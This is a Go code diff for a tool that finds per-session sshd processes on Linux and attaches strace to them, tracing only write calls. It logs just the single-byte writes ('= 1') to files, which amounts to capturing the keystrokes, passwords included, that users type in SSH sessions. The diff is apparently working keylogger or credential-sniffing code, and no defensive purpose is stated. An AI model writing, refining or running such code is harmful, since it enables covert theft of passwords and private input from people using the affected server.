@@ -17,6 +17,7 @@ var mu sync.Mutex
 
 func GetSSHProcesses() ([]int, error) {
 	var sshPids []int
+	var listenerPID int
 
 	entries, err := os.ReadDir("/proc")
 	if err != nil {
@@ -24,22 +25,46 @@ func GetSSHProcesses() ([]int, error) {
 	}
 
 	for _, entry := range entries {
-		if entry.IsDir() {
-			pid, err := strconv.Atoi(entry.Name())
-			if err != nil {
-				continue
-			}
+		if !entry.IsDir() {
+			continue
+		}
 
-			cmdlinePath := fmt.Sprintf("/proc/%d/cmdline", pid)
-			cmdline, err := os.ReadFile(cmdlinePath)
-			if err != nil {
-				continue
-			}
+		pid, err := strconv.Atoi(entry.Name())
+		if err != nil {
+			continue
+		}
 
-			if strings.Contains(string(cmdline), "sshd") {
-				sshPids = append(sshPids, pid)
+		cmdlineBytes, err := os.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
+		if err != nil {
+			continue
+		}
+		cmdline := string(cmdlineBytes)
+
+		if !strings.Contains(cmdline, "sshd") {
+			continue
+		}
+
+		// Find the SSH listener (likely parent is PID 1)
+		statBytes, err := os.ReadFile(fmt.Sprintf("/proc/%d/stat", pid))
+		if err != nil {
+			continue
+		}
+
+		fields := strings.Fields(string(statBytes))
+		if len(fields) >= 4 {
+			ppid, err := strconv.Atoi(fields[3])
+			if err == nil && ppid == 1 && listenerPID == 0 {
+				listenerPID = pid
+				continue // skip the main listener
 			}
 		}
+
+		// Skip if this is the same as the listener
+		if pid == listenerPID {
+			continue
+		}
+
+		sshPids = append(sshPids, pid)
 	}
 
 	return sshPids, nil
@@ -60,7 +85,7 @@ func StartTracing(pid int) {
 		Flags: map[string]string{
 			"-s": "16384",
 			"-p": strconv.Itoa(pid),
-			"-e": "read,write",
+			"-e": "write",
 		},
 	}
 
@@ -69,15 +94,28 @@ func StartTracing(pid int) {
 		log.Printf("Failed to start trace on PID %d: %v", pid, err)
 		return
 	}
+	stderrFile, err := os.Create(fmt.Sprintf("trace_err_%d.log", pid))
+	if err != nil {
+		log.Printf("Failed to create stderr log file for PID %d: %v", pid, err)
+		return
+	}
 
 	go func() {
+		defer stderrFile.Close()
+
 		for {
-			fmt.Printf("[PID %d] Err: %s\n", pid, s.Stderr.String())
-			fmt.Printf("[PID %d] Out: %s\n", pid, s.Stdout.String())
+			stderrStr := s.Stderr.String()
+			if stderrStr != "" {
+				lines := strings.Split(stderrStr, "\n")
+				for _, line := range lines {
+					line = strings.TrimSpace(line)
+					if strings.HasSuffix(line, "= 1") {
+						stderrFile.WriteString(line + "\n")
+					}
+				}
+			}
 
 			s.Stderr.Reset()
-			s.Stdout.Reset()
-
 			time.Sleep(1 * time.Second)
 		}
 	}()
